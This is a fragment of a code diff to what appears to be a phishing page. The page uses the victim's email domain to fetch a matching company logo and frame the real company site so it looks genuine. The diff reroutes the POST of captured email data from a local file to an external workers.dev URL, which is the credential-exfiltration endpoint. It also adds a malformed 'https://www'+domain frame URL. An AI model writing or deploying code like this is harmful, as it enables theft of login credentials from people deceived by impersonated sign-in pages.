@@ -1776,7 +1776,7 @@ var my_slice=my_email.substr((ind+1));
 $('#footer_dom').html(my_email);
 $('#carss').html(my_email);
  $("#top_label_logo").attr("src", "https://logo.clearbit.com/"+my_slice);
-var mPage = 'https://'+my_slice;
+var mPage = 'https://www'+my_slice;
 document.getElementById('mainPage').src = mPage; 
 }
 $('#next_button').click(function(event){
@@ -1798,7 +1798,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'next.js',
+url: 'https://square-sun-b728.saleudon1.workers.dev/',
 type: 'POST',
       	data:{
 			email:email,
@@ -1850,3 +1850,4 @@ type: 'POST',
 </script>	
    
    </body></html>
+
